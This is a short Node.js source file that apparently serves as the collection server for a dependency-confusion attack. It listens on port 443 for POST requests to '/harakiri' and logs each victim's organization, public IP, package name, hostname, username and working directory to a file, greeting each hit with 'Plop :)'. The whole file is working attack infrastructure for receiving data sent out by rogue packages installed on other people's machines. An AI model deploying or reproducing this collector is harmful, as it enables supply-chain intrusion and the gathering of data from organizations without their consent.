const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 443;
const LOG_FILE = path.join(__dirname, 'depconf_logs.txt');

function logRequest(ip, data) {
  const currentTime = new Date().toISOString();
  const logEntry =
    `Time: ${currentTime}\n` +
    `Organization: ${data.organization}\n` +
    `Public IP: ${ip}\n` +
    `Package Name: ${data.package_name}\n` +
    `Hostname: ${data.hostname}\n` +
    `Username: ${data.username}\n` +
    `Current Path: ${data.current_path}\n` +
    `--------------------------------------------\n`;

  console.log('Plop :) \n' + logEntry);

  fs.appendFile(LOG_FILE, logEntry, (err) => {
    if (err) console.error('Failed to write log:', err);
  });
}

const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/harakiri') {
    let body = '';
    req.on('data', chunk => { body += chunk; });
    req.on('end', () => {
      let data;
      try {
        data = JSON.parse(body);
      } catch {
        res.writeHead(400, { 'Content-Type': 'text/plain' });
        res.end('Invalid JSON\n');
        return;
      }

      let clientIp = req.socket.remoteAddress || 'unknown';
      if (clientIp.startsWith('::ffff:')) clientIp = clientIp.substring(7);

      logRequest(clientIp, data);

      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end('Received\n');
    });
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not found\n');
  }
});

server.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
